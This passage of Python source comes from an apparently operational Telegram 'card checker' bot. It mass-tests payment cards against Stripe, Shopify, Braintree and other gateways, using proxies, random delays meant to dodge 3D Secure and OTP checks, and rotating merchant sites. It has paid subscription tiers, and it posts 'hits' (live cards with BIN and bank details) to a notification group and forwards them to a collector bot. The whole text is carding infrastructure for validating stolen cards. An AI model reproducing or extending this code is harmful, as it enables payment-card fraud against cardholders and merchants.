            status_display = "✅ CVV LIVE"
            status_category = "approved"
        elif "3D" in response_upper or "OTP" in response_upper or "SECURE" in response_upper:
            status_display = "🔐 3D REQUIRED"
            status_category = "approved"
        else:
            status_display = "✅ APPROVED"
            status_category = "approved"
        
        try:
            price_float = float(price)
            price_str = f"${price_float:.2f}"
        except:
            price_str = f"${price}"
        
        if username:
            user_display = f"{first_name} (@{username})"
        else:
            user_display = f"{first_name}"
        
        hit_id = f"HIT-{datetime.now().strftime('%Y%m%d')}-{random.randint(1000, 9999)}"
        
        # ============ PREMIUM EMOJIS - Replace with your actual emoji IDs ============
        # Get these from @AdsMarkdownBot by sending a Premium emoji
        PREMIUM_EMOJI_IDS = {
            "diamond": "5427168083074628963",  # 💎
            "fire": "5471133374264684999",      # 🔥
            "skull": "5042167377869932162",      # 💀
            "target": "5256131095094652290",     # 🎯
            "alien": "5869573060030683138",      # 👾
            "money": "6002386288612653951",      # 🙈
            "smile": "6230927657257668107",      # 😁
            "devil": "6268012745776588577",      # 😈
        }
        
        # Build notification with Premium emojis using HTML format
        notification = (
            f'╔══════════════════════════╗\n'
            f'    <tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji> '
            f'𝑯𝒊𝒕 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅\n'
            f'╚══════════════════════════╝\n\n'
            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["alien"]}">👾</tg-emoji> <b>Gateway</b> ➛ {gateway}\n'
            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["money"]}">🙈</tg-emoji> <b>Price</b> ➛ {price_str}\n'
            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["smile"]}">😁</tg-emoji> <b>Response</b> ➛ {response}\n'
            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["devil"]}">😈</tg-emoji> <b>User</b> ➛ {user_display}\n'
            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["target"]}">🎯</tg-emoji> <b>Tier</b> ➛ {user_tier.upper()}\n'
            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["skull"]}">💀</tg-emoji> <b>Hit From</b> ➛ @Bladesarksbot'
        )
        
        # Send notification
        if HIT_NOTIFICATION_ENABLED:
            await context.bot.send_message(
                chat_id=HIT_NOTIFICATION_GROUP_ID,
                text=notification,
                parse_mode="HTML"
            )
            print(f"📢 Manual hit notification sent for user {user_id}")
        
        # Record in leaderboard
        try:
            leaderboard.record_hit(
                user_id=user_id,
                username=username or first_name,
                gateway=gateway,
                amount=float(price)
            )
        except:
            pass
        
        # Send confirmation to admin
        await update.message.reply_text(
            f"✅ <b>Hit Notification Sent!</b>\n\n"
            f"🆔 Hit ID: <code>{hit_id}</code>\n"
            f"👤 User: {user_display}\n"
            f"💳 Card: <code>{card[:6]}******{card[-4:]}</code>\n"
            f"🌐 Gateway: {gateway}\n"
            f"{status_display}\n\n"
            f"📢 Notification sent to hit notification group.",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid value: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
        

async def test_premium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test if Premium emojis work - /testpremium"""
    
    # Replace with YOUR actual emoji ID from @AdsMarkdownBot
    TEST_EMOJI_ID = "5368324170671202286"  # Change this to your actual ID
    
    # Method 1: Using tg-emoji HTML tag
    try:
        await update.message.reply_text(
            f'<tg-emoji emoji-id="{TEST_EMOJI_ID}">🔥</tg-emoji> This is a Premium emoji test!',
            parse_mode="HTML"
        )
        print("✅ Sent test message with Premium emoji")
    except Exception as e:
        print(f"❌ Failed to send: {e}")
        await update.message.reply_text(f"Error: {e}")


# ============ HIT NOTIFICATION FUNCTION ============
async def send_hit_notification(context: ContextTypes.DEFAULT_TYPE, 
                                gateway: str, 
                                card: str, 
                                response: str, 
                                price: str, 
                                user: dict,
                                bin_info: tuple = None,
                                status_category: str = "charged"):
    """Send hit notification to the configured group - FIXED to prevent duplicates"""
    
    if not HIT_NOTIFICATION_ENABLED:
        return
    
    # Debug print
    print(f"🔔 Sending hit notification - Gateway: {gateway}, Response: {response[:100]}")
    
    # Check if this is a hit based on response patterns
    response_upper = response.upper()
    hit_patterns = [
        "CHARGE 2$", "CHARGE 2", "CHARGED", "ORDER COMPLETED", 
        "NEW PAYMENT METHOD ADDED SUCCESSFULLY", "EXISTING_ACCOUNT_RESTRICTED",
        "PAID", "SUCCESS"
    ]
    
    is_hit = any(pattern in response_upper for pattern in hit_patterns)
    
    # Only send notification if it's a hit
    if not is_hit and status_category != "charged":
        print(f"⚠️ Not a hit, skipping notification. Response: {response[:50]}")
        return
    
    bin_info_text, bank, country, currency_code, country_code = bin_info if bin_info else ("N/A", "N/A", "🌐 N/A", "N/A", "N/A")
    
    user_name = user.get('first_name', 'Unknown')
    if user.get('username'):
        user_display = f"@{user['username']}"
    else:
        user_display = f"{user_name} (ID: {user.get('id', 'Unknown')})"
    
    tier = user.get('tier', 'free')
    
    # ============ YOUR ACTUAL PREMIUM EMOJI IDs ============
    PREMIUM_EMOJI_IDS = {
        "skull": "5042167377869932162",
        "target": "5256131095094652290",
        "toy": "5249244862359812334",
        "diamond": "5427168083074628963",
        "flower": "6230927657257668107",
        "pink": "5041796412954641308",
        "doller": "5197434882321567830"
    }
    
    # Determine price display
    try:
        price_float = float(price.replace('$', '').replace('₹', ''))
        price_display = f"${price_float:.2f}" if '$' not in price else price
    except:
        price_display = price
    
    # Determine hit emoji based on response
    if "CHARGE 2$" in response_upper or "CHARGED" in response_upper:
        hit_emoji_code = PREMIUM_EMOJI_IDS["diamond"]
    elif "ORDER COMPLETED" in response_upper:
        hit_emoji_code = PREMIUM_EMOJI_IDS["diamond"]
    elif "NEW PAYMENT METHOD ADDED SUCCESSFULLY" in response_upper:
        hit_emoji_code = PREMIUM_EMOJI_IDS["target"]
    elif "EXISTING_ACCOUNT_RESTRICTED" in response_upper:
        hit_emoji_code = PREMIUM_EMOJI_IDS["target"]
    else:
        hit_emoji_code = PREMIUM_EMOJI_IDS["skull"]
    
    # Build message with Premium emojis only (no fallback)
    hit_message = (
        f'╔══════════════════╗\n'
        f'     ⩙ 𝑯𝒊𝒕 '
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
        f' 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅\n'
        f'╚══════════════════╝\n\n'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["pink"]}">💎</tg-emoji> <b>Gateway</b> ↬ {gateway}\n'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["flower"]}">🌸</tg-emoji> <b>Price</b> ↬ {price_display}\n'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["doller"]}">💵</tg-emoji> <b>Response</b> ↬ {response}\n'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["toy"]}">📍</tg-emoji> <b>User</b> ↬ {user_display}\n'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["target"]}">🎯</tg-emoji> <b>Tier</b> ↬ {tier.upper()}\n'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["skull"]}">☠️</tg-emoji> <b>Hit From</b> ↬ @Bladesarksbot'
    )
    
    # Send ONLY ONE notification
    try:
        await context.bot.send_message(
            chat_id=HIT_NOTIFICATION_GROUP_ID,
            text=hit_message,
            parse_mode="HTML"
        )
        print(f"✅ Hit notification sent successfully! Gateway: {gateway}, Card: {card[:6]}xxxxxx{card[-4:]}")
        
        # Forward to collector bot (separate, doesn't affect duplicate)
        asyncio.create_task(
            send_hit_to_forwarder(
                card=card,
                gateway=gateway,
                response=response,
                price=price_display,
                bin_info=bin_info,
                user_id=user.get('id', 0),
                user_tier=user.get('tier', 'free'),
                status_category=status_category
            )
        )
        
    except Exception as e:
        print(f"❌ Failed to send hit notification: {e}")

# ============ USER MANAGEMENT SYSTEM (UPDATED WITH CREDITS) ============

class UserManager:
    """Complete user management system with improved tiers and worker mode"""
    
    TIERS = {
        "free": {
            "max_checks_per_day": 500,
            "max_batch_size": 100,
            "can_use_proxy": True,
            "can_access_gateways": [
            ],
            "can_add_autosopi_sites": False,
            "can_mass_check": False,  # Yes, but with worker mode
            "rate_limit": 0.5,
            "concurrency": 1,  # Not used in worker mode
            "workers": 3,       # 3 sequential workers
            "worker_delay": 1.5,  # Delay between cards
            "color": "🥲",
            "price": "$0",
            "emoji": "🆓",
            "speed_cph": 180  # 3 cards per minute
        },
        "premium": {
            "max_checks_per_day": 500000,
            "max_batch_size": 3000,
            "can_use_proxy": True,
            "can_access_gateways": [
                "shopify", "auto_stripe", "adyen_direct", "paypal", 
                "b3charged", "razorpay", "stripe_charge", "stripe_auth", 
                "braintree", "autosopi", "payflow"
            ],
            "can_add_autosopi_sites": True,
            "can_mass_check": True,
            "rate_limit": 0.2,
            "concurrency": 1,
            "workers": 5,       # 5 sequential workers
            "worker_delay": 1.0,  # 1 second between cards
            "color": "🔥",
            "price": "$10/month",
            "emoji": "💎",
            "speed_cph": 300  # 5 cards per minute
        },
        "ultimate": {
            "max_checks_per_day": 1000000,
            "max_batch_size": 5000,
            "can_use_proxy": True,
            "can_access_gateways": [
                "shopify", "auto_stripe", "adyen_direct", "paypal", 
                "b3charged", "razorpay", "stripe_charge", "stripe_auth", 
                "dork", "braintree", "autosopi", "payflow"
            ],
            "can_add_autosopi_sites": True,
            "can_mass_check": True,
            "rate_limit": 0.1,
            "concurrency": 1,
            "workers": 10,      # 10 sequential workers
            "worker_delay": 0.8,  # 0.8 seconds between cards
            "color": "😈",
            "price": "$20/month",
            "emoji": "👑",
            "speed_cph": 600  # 10 cards per minute
        },
        "admin": {
            "max_checks_per_day": float('inf'),
            "max_batch_size": 1000000,
            "can_use_proxy": True,
            "can_access_gateways": [
                "paypal", "shopify", "adyen_direct", "auto_stripe", 
                "b3charged", "razorpay", "stripe_charge", "stripe_auth", 
                "braintree", "autosopi", "payflow"
            ],
            "can_add_autosopi_sites": True,
            "can_mass_check": True,
            "rate_limit": 0,
            "concurrency": 10,
            "workers": 20,      # 20 sequential workers
            "worker_delay": 0.5,  # 0.5 seconds between cards
            "color": "💀",
            "price": "∞",
            "emoji": "👑",
            "speed_cph": 5000  # 20 cards per minute
        }
    }
    
    def __init__(self, data_file=USER_DATA_FILE):
        self.data_file = data_file
        self.users = self.load_users()
        self.cache = {}
        for uid, data in self.users.items():
            self.cache[int(uid)] = data
        
    def load_users(self):
        if Path(self.data_file).exists():
            try:
                with open(self.data_file, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def save_users(self):
        with open(self.data_file, 'w') as f:
            json.dump(self.users, f, indent=2)
    
    def get_user(self, user_id: int) -> dict:
        user_id_str = str(user_id)
        if user_id_str not in self.users:
            tier = "admin" if user_id == OWNER_ID else "free"
            self.users[user_id_str] = {
                "id": user_id,
                "tier": tier,
                "joined": time.time(),
                "total_checks": 0,
                "total_hits": 0,
                "daily_checks": {},
                "last_check": 0,
                "username": "",
                "first_name": "",
                "total_spent": 0,
                "last_reset": time.time(),
                "sites_added": 0,
                "tier_expiry": 0,
                "upgraded_from": None,
                "credits_used": 0,
                "keys_redeemed": 0,
                "last_credit_reset": time.time()
            }
            self.cache[user_id] = self.users[user_id_str]
            self.save_users()
        return self.users[user_id_str]
    
    def update_user_info(self, user_id: int, username: str, first_name: str):
        user = self.get_user(user_id)
        user["username"] = username
        user["first_name"] = first_name
        self.save_users()
    
    def get_tier(self, user_id: int) -> str:
        user = self.get_user(user_id)
        tier = user["tier"]
        
        if user.get("tier_expiry", 0) > 0 and user["tier_expiry"] < time.time():
            original_tier = user.get("upgraded_from", "free")
            user["tier"] = original_tier
            user["tier_expiry"] = 0
            user["upgraded_from"] = None
            self.save_users()
            return original_tier
        
        return tier
    
    def set_tier(self, user_id: int, tier: str, admin_id: int) -> bool:
        if admin_id != OWNER_ID:
            return False
        if tier not in self.TIERS:
            return False
        user = self.get_user(user_id)
        user["tier"] = tier
        user["last_reset"] = time.time()
        self.save_users()
        return True
    
    def can_access_gateway(self, user_id: int, gateway: str) -> bool:
        tier = self.get_tier(user_id)
        return gateway in self.TIERS[tier]["can_access_gateways"]
    
    def can_mass_check(self, user_id: int) -> bool:
        """Check if user can use mass check"""
        tier = self.get_tier(user_id)
        return self.TIERS[tier].get("can_mass_check", False)
    
    def can_add_autosopi_sites_directly(self, user_id: int) -> bool:
        tier = self.get_tier(user_id)
        return self.TIERS[tier].get("can_add_autosopi_sites", False)
    
    def check_rate_limit(self, user_id: int) -> Tuple[bool, float]:
        user = self.get_user(user_id)
        tier = self.get_tier(user_id)
        rate_limit = self.TIERS[tier]["rate_limit"]
        
        if rate_limit == 0:
            return True, 0
        
        last_check = user.get("last_check", 0)
        time_diff = time.time() - last_check
        
        if time_diff < rate_limit:
            wait_time = rate_limit - time_diff
            return False, wait_time
        return True, 0
    
    def check_daily_limit(self, user_id: int) -> Tuple[bool, int]:
        user = self.get_user(user_id)
        tier = self.get_tier(user_id)
        max_checks = self.TIERS[tier]["max_checks_per_day"]
        
        if max_checks == float('inf'):
            return True, 0
        
        today = datetime.now().strftime("%Y-%m-%d")
        if "daily_checks" not in user:
            user["daily_checks"] = {}
        
        cutoff = (datetime.now() - timedelta(days=7)).strftime("%Y-%m-%d")
        user["daily_checks"] = {k: v for k, v in user["daily_checks"].items() if k >= cutoff}
        
        daily_checks = user["daily_checks"].get(today, 0)
        
        if daily_checks >= max_checks:
            return False, max_checks
        return True, max_checks - daily_checks
    
    def increment_checks(self, user_id: int, count: int = 1):
        user = self.get_user(user_id)
        user["total_checks"] += count
        user["last_check"] = time.time()
        
        today = datetime.now().strftime("%Y-%m-%d")
        if "daily_checks" not in user:
            user["daily_checks"] = {}
        user["daily_checks"][today] = user["daily_checks"].get(today, 0) + count
        self.save_users()
    
    def increment_hits(self, user_id: int):
        user = self.get_user(user_id)
        user["total_hits"] = user.get("total_hits", 0) + 1
        self.save_users()
    
    def increment_sites_added(self, user_id: int):
        user = self.get_user(user_id)
        user["sites_added"] = user.get("sites_added", 0) + 1
        self.save_users()
    
    def get_max_batch_size(self, user_id: int) -> int:
        tier = self.get_tier(user_id)
        return self.TIERS[tier]["max_batch_size"]
    
    def get_concurrency(self, user_id: int) -> int:
        tier = self.get_tier(user_id)
        return self.TIERS[tier]["concurrency"]
    
    def can_use_proxy(self, user_id: int) -> bool:
        tier = self.get_tier(user_id)
        return self.TIERS[tier]["can_use_proxy"]
    
    # ============ WORKER MODE METHODS ============
    
    def get_worker_config(self, user_id: int) -> dict:
        """Get worker configuration for user"""
        tier = self.get_tier(user_id)
        config = self.TIERS[tier]
        return {
            "workers": config.get("workers", 3),
            "delay": config.get("worker_delay", 1.0),
            "name": f"{config['emoji']} {tier.upper()}",
            "speed_cph": config.get("speed_cph", 180)
        }
    
    def get_worker_display(self, user_id: int) -> str:
        """Get formatted worker info for display"""
        config = self.get_worker_config(user_id)
        return f"{config['workers']} workers ({config['delay']}s delay)"
    
    # ============ CREDIT SYSTEM METHODS ============
    
    def get_user_credits(self, user_id: int) -> int:
        """
        Get user's remaining credits
        Returns: credits remaining (int) or float('inf') for paid users
        """
        tier = self.get_tier(user_id)
        if tier != 'free':
            return float('inf')
        return get_user_credits(user_id)
    
    def has_enough_credits(self, user_id: int, required: int = 1) -> bool:
        """
        Check if user has enough credits for a check
        Returns: True if has enough credits or is paid user
        """
        tier = self.get_tier(user_id)
        if tier != 'free':
            return True
        credits = get_user_credits(user_id)
        return credits >= required
    
    def use_credit(self, user_id: int, amount: int = CREDITS_PER_CHECK) -> bool:
        """
        Use credits for a check (only for free users)
        Returns: True if successful, False if not enough credits
        """
        tier = self.get_tier(user_id)
        if tier != 'free':
            return True
        if deduct_user_credits(user_id, amount):
            user = self.get_user(user_id)
            user["credits_used"] = user.get("credits_used", 0) + amount
            self.save_users()
            return True
        return False
    
    def initialize_user_credits(self, user_id: int) -> int:
        """
        Initialize credits for new user (only if free tier)
        Returns: initial credits amount
        """
        tier = self.get_tier(user_id)
        if tier != 'free':
            return float('inf')
        current = get_user_credits(user_id)
        if current > 0:
            return current
        return initialize_new_user_credits(user_id)
    
    def get_credits_display(self, user_id: int) -> str:
        """
        Get formatted credit display for user
        Returns: string like "250 credits" or "∞ (Unlimited)"
        """
        tier = self.get_tier(user_id)
        if tier != 'free':
            return "∞ (Unlimited)"
        credits = get_user_credits(user_id)
        return f"{credits} credits"
    
    def add_credits(self, user_id: int, amount: int) -> int:
        """
        Add credits to a user (admin only)
        Returns: new total
        """
        tier = self.get_tier(user_id)
        if tier != 'free':
            return float('inf')
        return add_user_credits(user_id, amount)
    
    def set_credits(self, user_id: int, amount: int) -> int:
        """
        Set exact credits for a user (admin only)
        Returns: new total
        """
        tier = self.get_tier(user_id)
        if tier != 'free':
            return float('inf')
        user_credits[user_id] = amount
        save_user_credits()
        return amount
    
    def reset_credits(self, user_id: int) -> int:
        """
        Reset user credits to initial amount (admin only)
        Returns: new total
        """
        tier = self.get_tier(user_id)
        if tier != 'free':
            return float('inf')
        reset_user_credits(user_id)
        return INITIAL_FREE_CREDITS
    
    def get_credits_stats(self, user_id: int) -> dict:
        """
        Get detailed credit statistics for a user
        """
        tier = self.get_tier(user_id)
        user = self.get_user(user_id)
        
        if tier != 'free':
            return {
                "tier": tier,
                "unlimited": True,
                "credits": float('inf'),
                "used": user.get("credits_used", 0),
                "remaining": float('inf')
            }
        
        credits = get_user_credits(user_id)
        used = user.get("credits_used", 0)
        
        return {
            "tier": "free",
            "unlimited": False,
            "credits": credits,
            "used": used,
            "remaining": credits,
            "cost_per_check": CREDITS_PER_CHECK,
            "estimated_checks": credits // CREDITS_PER_CHECK
        }
    
    def get_user_stats(self, user_id: int) -> dict:
        """Get complete user stats including credit info and worker config"""
        user = self.get_user(user_id)
        tier = self.get_tier(user_id)
        today = datetime.now().strftime("%Y-%m-%d")
        daily = user.get("daily_checks", {}).get(today, 0)
        
        tier_expiry = user.get("tier_expiry", 0)
        if tier_expiry > 0:
            expiry_date = datetime.fromtimestamp(tier_expiry).strftime("%Y-%m-%d %H:%M")
            expiry_text = f" (expires: {expiry_date})"
        else:
            expiry_text = ""
        
        # Get credit info
        credit_info = self.get_credits_stats(user_id)
        
        # Get worker config
        worker_config = self.get_worker_config(user_id)
        
        return {
            "tier": tier,
            "color": self.TIERS[tier]["color"],
            "total_checks": user["total_checks"],
            "total_hits": user.get("total_hits", 0),
            "daily_checks": daily,
            "daily_limit": self.TIERS[tier]["max_checks_per_day"],
            "batch_limit": self.TIERS[tier]["max_batch_size"],
            "concurrency": self.TIERS[tier]["concurrency"],
            "workers": worker_config["workers"],
            "worker_delay": worker_config["delay"],
            "worker_speed": worker_config["speed_cph"],
            "proxy_allowed": self.TIERS[tier]["can_use_proxy"],
            "joined": datetime.fromtimestamp(user["joined"]).strftime("%Y-%m-%d"),
            "rate_limit": self.TIERS[tier]["rate_limit"],
            "price": self.TIERS[tier]["price"],
            "can_add_sites_directly": self.TIERS[tier].get("can_add_autosopi_sites", False),
            "can_mass_check": self.TIERS[tier].get("can_mass_check", False),
            "sites_added": user.get("sites_added", 0),
            "expiry_text": expiry_text,
            "emoji": self.TIERS[tier]["emoji"],
            "credits": credit_info.get("credits", 0),
            "credits_used": credit_info.get("used", 0),
            "credits_unlimited": credit_info.get("unlimited", False),
            "estimated_checks": credit_info.get("estimated_checks", 0),
            "keys_redeemed": user.get("keys_redeemed", 0)
        }
    
    def list_users(self) -> List[dict]:
        """List all users with credit info and worker config"""
        users_list = []
        for uid, data in self.users.items():
            today = datetime.now().strftime("%Y-%m-%d")
            tier = data.get("tier", "free")
            
            if data.get("tier_expiry", 0) > 0 and data["tier_expiry"] < time.time():
                tier = data.get("upgraded_from", "free")
            
            # Get credit info
            credits = get_user_credits(int(uid)) if tier == 'free' else "∞"
            
            # Get worker config
            worker_config = self.TIERS[tier]
            workers = worker_config.get("workers", 3)
            
            users_list.append({
                "id": uid,
                "username": data.get("username", "Unknown"),
                "tier": tier,
                "workers": workers,
                "total_checks": data.get("total_checks", 0),
                "total_hits": data.get("total_hits", 0),
                "daily_checks": data.get("daily_checks", {}).get(today, 0),
                "joined": datetime.fromtimestamp(data.get("joined", 0)).strftime("%Y-%m-%d"),
                "last_active": datetime.fromtimestamp(data.get("last_check", 0)).strftime("%Y-%m-%d %H:%M") if data.get("last_check") else "Never",
                "sites_added": data.get("sites_added", 0),
                "tier_expiry": data.get("tier_expiry", 0),
                "credits": credits,
                "credits_used": data.get("credits_used", 0),
                "keys_redeemed": data.get("keys_redeemed", 0)
            })
        return sorted(users_list, key=lambda x: x["total_checks"], reverse=True)
    
    def reset_daily_limits(self):
        """Reset daily limits for all users"""
        today = datetime.now().strftime("%Y-%m-%d")
        for uid, user in self.users.items():
            if "daily_checks" not in user:
                user["daily_checks"] = {}
            cutoff = (datetime.now() - timedelta(days=7)).strftime("%Y-%m-%d")
            user["daily_checks"] = {k: v for k, v in user["daily_checks"].items() if k >= cutoff}
        self.save_users()
        
        
# ============ NEW STRIPE API COMMAND HANDLERS ============

async def single_check_new_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with new Stripe API - /nstripe <card>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>New Stripe API Single Check</b>\n\n"
            "Usage: <code>/nstripe &lt;card&gt;</code>\n"
            "Example: <code>/nstripe 4242424242424242|12|2028|123</code>\n\n"
            "💰 Amount: $0.50\n"
            "📍 Gateway: Stripe Charge (New API)\n"
            "🌐 Endpoint: stripe-production-45f5.up.railway.app\n"
            "⏱️ Random delay: 1-2 seconds to avoid 3D/OTP",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    card_text = " ".join(context.args).strip()
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await message.reply_text(
            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
            "Example: 4242424242424242|12|2028|123"
        )
        return
    
    # Add random delay before processing (1-2 seconds)
    delay = random.uniform(1.0, 2.0)
    checking_msg = await message.reply_text(f"🔄 Checking card (delay: {delay:.1f}s)...")
    await asyncio.sleep(delay)
    
    # Mark user as active
    stripe_charge_active_tasks[user_id] = True
    
    try:
        # Check user access
        if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
            await checking_msg.edit_text("❌ Your tier doesn't have access to Stripe Charge gateway.")
            return
        
        tier = user_manager.get_tier(user_id)
        if user_id not in user_speed_controllers:
            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[user_id]
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        # Get proxy if allowed
        proxy_str = get_proxy_for_user(user_id) if user_manager.can_use_proxy(user_id) else None
        
        # Make the API call using the updated function
        result = await check_card_new_stripe(card, proxy_str)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        # Get BIN info
        bin_info = await get_bin_info(card)
        
        # Format response
        ui, status_category = format_new_stripe_response(result, card, bin_info)
        
        # Delete checking animation
        try:
            await checking_msg.delete()
        except:
            pass
        
        # Send result
        await message.reply_text(ui, parse_mode=ParseMode.HTML)
        
        # Save hit if approved or charged
        if status_category in ["charged", "approved"]:
            user_data = user_manager.get_user(user_id)
            response_msg = result.get("message", "Approved") if result else "Approved"
            
            await send_hit_notification(
                context=context,
                gateway="New Stripe API",
                card=card,
                response=response_msg,
                price=result.get("price", "$0.50"),
                user=user_data,
                bin_info=bin_info,
                status_category=status_category
            )
            
            await save_hit_to_file(
                card=card,
                gateway="New Stripe API",
                response=response_msg,
                price=result.get("price", "$0.50"),
                bin_info=bin_info,
                user_id=user_id,
                user_tier=tier
            )
            
            user_manager.increment_hits(user_id)
        
        user_manager.increment_checks(user_id)
        
    except Exception as e:
        try:
            await checking_msg.delete()
        except:
            pass
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [New Stripe Single] Error: {traceback.format_exc()}")
    finally:
        stripe_charge_active_tasks.pop(user_id, None)
        
        
        
async def mass_check_auto_stripe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single wrapper for /mchk command"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    # Check if user has access
    if not user_manager.can_access_gateway(user_id, 'auto_stripe'):
        await message.reply_text("❌ Your tier doesn't have access to Auto Stripe gateway.")
        return
    
    # Get the site for this user
    site = auto_stripe_site_manager.get_site_for_user(user_id)
    if not site:
        await message.reply_text(
            "❌ No site configured.\n\n"
            "Use /setautosite <site> to set your preferred site.\n"
            "Example: /setautosite dilaboards.com"
        )
        return
    
    # Extract cards
    cards = []
    
    # Check if replying to a file
    if message.reply_to_message and message.reply_to_message.document:
        try:
            file = await message.reply_to_message.document.get_file()
            content = await file.download_as_bytearray()
            content = content.decode('utf-8', errors='ignore')
            
            for line in content.splitlines():
                line = line.strip()
                if line and not line.startswith('#'):
                    card = card_formatter.extract_single_card_from_text(line)
                    if card:
                        cards.append(card)
        except Exception as e:
            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
            return
    else:
        # Extract from command arguments
        if not context.args:
            await message.reply_text(
                "📦 <b>Auto Stripe Mass Check</b>\n\n"
                "Usage: /mchk &lt;card1&gt; &lt;card2&gt; ...\n"
                "Or reply to a .txt file with /mchk"
            )
            return
        
        cards_text = " ".join(context.args)
        for card_str in cards_text.split():
            card = card_formatter.extract_single_card_from_text(card_str)
            if card:
                cards.append(card)
    
    if not cards:
        await message.reply_text("❌ No valid cards found.")
        return
    
    # Check batch size limit
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        cards = cards[:max_batch]
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
    
    # Start mass check - CALL THE LOGIC FUNCTION ONCE
    await auto_stripe_mass_check_logic_with_progress(update, context, cards, site)
        
# ============ SITE REMOVAL COMMANDS ============

async def remove_sites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove multiple sites from Autosopi rotation - /rsites <pattern> or /rsites list"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can remove sites.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "🗑️ <b>Remove Sites Command</b>\n\n"
            "Usage:\n"
            "<code>/rsites list</code> - Show all sites with status\n"
            "<code>/rsites &lt;pattern&gt;</code> - Remove sites matching pattern\n"
            "<code>/rsites dead</code> - Remove all dead sites (3+ failures)\n"
            "<code>/rsites fake</code> - Remove all sites with authorize.net\n"
            "<code>/rsites all</code> - ⚠️ Remove ALL sites (use with caution!)\n\n"
            "Examples:\n"
            "<code>/rsites bndlstech</code> - Remove sites containing 'bndlstech'\n"
            "<code>/rsites myshopify.com</code> - Remove all Shopify test sites\n"
            "<code>/rsites .myshopify.com</code> - Remove all .myshopify.com sites\n\n"
            "<i>⚠️ This action cannot be undone!</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    pattern = " ".join(context.args).lower()
    
    # Show all sites with status
    if pattern == "list":
        await list_all_sites_with_status(update, context)
        return
    
    # Remove dead sites (3+ failures)
    if pattern == "dead":
        await remove_dead_sites(update, context)
        return
    
    # Remove fake sites (authorize.net)
    if pattern == "fake":
        await remove_fake_sites(update, context)
        return
    
    # Remove ALL sites (with confirmation)
    if pattern == "all":
        await remove_all_sites(update, context)
        return
    
    # Remove sites matching pattern
    await remove_sites_by_pattern(update, context, pattern)


async def list_all_sites_with_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all sites with their current status"""
    sites = autosopi_site_manager.sites
    failures = autosopi_site_manager.site_failures
    stats = autosopi_site_manager.site_stats
    
    if not sites:
        await update.message.reply_text("📋 No sites in rotation.", reply_markup=back_menu())
        return
    
    msg = "🌐 <b>Autosopi Sites - Status</b>\n\n"
    
    dead_sites = []
    warning_sites = []
    healthy_sites = []
    
    for site in sites:
        fail_count = failures.get(site, 0)
        site_stats = stats.get(site, {})
        total_checks = site_stats.get('total', 0)
        successes = site_stats.get('successes', 0)
        success_rate = (successes / total_checks * 100) if total_checks > 0 else 0
        
        if fail_count >= 3:
            dead_sites.append((site, fail_count, success_rate))
        elif fail_count > 0:
            warning_sites.append((site, fail_count, success_rate))
        else:
            healthy_sites.append((site, fail_count, success_rate))
    
    # Healthy sites
    if healthy_sites:
        msg += "✅ <b>Healthy Sites:</b>\n"
        for site, fails, rate in healthy_sites[:10]:
            msg += f"  • <code>{site}</code> (Success: {rate:.1f}%)\n"
        if len(healthy_sites) > 10:
            msg += f"  ... and {len(healthy_sites) - 10} more\n"
        msg += "\n"
    
    # Warning sites
    if warning_sites:
        msg += "⚠️ <b>Warning Sites (has failures):</b>\n"
        for site, fails, rate in warning_sites[:10]:
            msg += f"  • <code>{site}</code> (Fails: {fails}, Success: {rate:.1f}%)\n"
        if len(warning_sites) > 10:
